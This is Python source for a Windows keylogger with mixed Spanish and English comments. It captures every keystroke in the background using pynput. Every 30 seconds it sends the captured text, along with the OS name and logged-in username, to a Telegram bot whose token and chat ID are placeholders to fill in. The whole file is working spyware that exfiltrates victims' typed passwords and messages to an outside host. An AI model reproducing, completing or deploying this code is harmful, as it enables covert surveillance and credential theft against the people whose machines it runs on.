import time as t
from pynput import keyboard as k
import requests
import datetime
import os
import shutil
import subprocess
import win32api
import win32con
import win32gui
import ctypes
from PIL import ImageGrab


BOT_API_TOKEN = "YOUR _BOT_TOKEN"  # <----------- CHANGE
USER_ID = "YOUR_USER_ID"  #  	         <----------- CHANGE
LOG_INTERVAL = 30  # Log sending interval in seconds


keystrokes = []
log_start_time = datetime.datetime.now()


def send_telegram_message(body):
    global log_start_time
    
    header = f"--- SESSION STARTED: {log_start_time.strftime('%Y-%m-%d %H:%M:%S')} ---\n"

    context = f"SO: {os.name} | Usuario: {os.getlogin()} \n"
    full_message = header + context + "--- DATOS DEL LOG ---\n" + body
    
    try:
        url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/sendMessage"
        payload = {
            "chat_id": USER_ID,
            "text": full_message
        }
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Error sending message. Code status: {response.status_code}")
    except Exception as e:
        print(f"Error al enviar mensaje: {e}")
    
    # Reset the log start time after sending
    log_start_time = datetime.datetime.now()

# Keylogger handler
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystrokes.append(key.char)  # Almacena caracteres regulares
        else:
            key_name = str(key).replace('Key.', '')
            if key == k.Key.enter:
                keystrokes.append(' \n')  # Usa [ENTER] para la tecla Enter
            elif key == k.Key.backspace:
                keystrokes.append('[BACKSPACE]')  # Añade soporte para retroceso
            elif key == k.Key.tab:
                keystrokes.append('[TAB]')  # Añade soporte para tabulador
            else:
                keystrokes.append(f"[{key_name.upper()}]")  # Teclas especiales en mayúsculas
        print(f"Tecla pulsada: {key}")  # Debug print
    except Exception as e:
        print(f"Error al procesar tecla: {e}")

# Listener on background
listener = k.Listener(on_press=on_press)
listener.start()
print("Keylogger started.")  # Debug print

# Loop for Keylogger
while True:
    t.sleep(LOG_INTERVAL)
    if keystrokes:
        log_data = ''.join(keystrokes)
        send_telegram_message(log_data)
        keystrokes.clear()
        print(f"Data log sent: {log_data}")  # Debug print
